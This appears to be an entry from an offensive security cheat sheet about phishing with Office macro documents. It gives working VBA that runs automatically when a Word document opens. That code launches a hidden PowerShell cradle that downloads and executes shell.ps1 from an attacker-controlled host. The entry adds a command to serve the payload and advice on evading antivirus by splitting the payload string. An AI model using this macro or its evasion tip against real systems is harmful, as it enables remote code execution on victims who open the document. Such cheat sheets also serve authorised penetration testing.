title: Client-Side — Office Macro (VBA)
body: Classic macro doc. Requires Office installed AND the user to enable macros, so it's less reliable than the library chain — but strong when you know the target uses Office. Save as .doc (legacy), not .docx — .docx can't store macros.
cmd:
# In the VBA editor (Alt+F11) > Insert > Module:
Sub AutoOpen()
  Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"
End Sub
Sub Document_Open()
  AutoOpen
End Sub
#   AutoOpen + Document_Open = fires on open. Save as Word 97-2003 .doc.

# Serve the cradle target:
python3 -m http.server 80   # hosting shell.ps1
warn: Save as .doc not .docx (docx is macro-incapable). For AV evasion, split the payload string into a char array / concatenated chunks rather than one plaintext command.
